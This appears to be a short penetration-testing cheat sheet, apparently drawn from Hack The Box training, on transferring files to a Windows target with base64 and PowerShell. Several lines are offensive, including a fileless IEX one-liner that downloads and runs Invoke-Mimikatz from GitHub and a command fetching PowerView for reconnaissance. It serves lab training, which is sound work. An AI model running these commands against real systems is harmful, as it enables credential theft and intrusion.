# Windows
## 1. Base64 Encode & Decode

Attacker machine:
```bash
genzpentester@htb[/htb]$ cat id_rsa |base64 -w 0;echo
```

Target Machine:
```bash
powershell-session
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("hdjsdhjshdsjhds=="))
```

## 2. PowerShell DownloadFile Method

[System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over `HTTP`, `HTTPS` or `FTP`.

```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```

## 3. PowerShell DownloadString - Fileless Method

 Using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.

```bash
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

## 4. PowerShell Invoke-WebRequest

 You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```



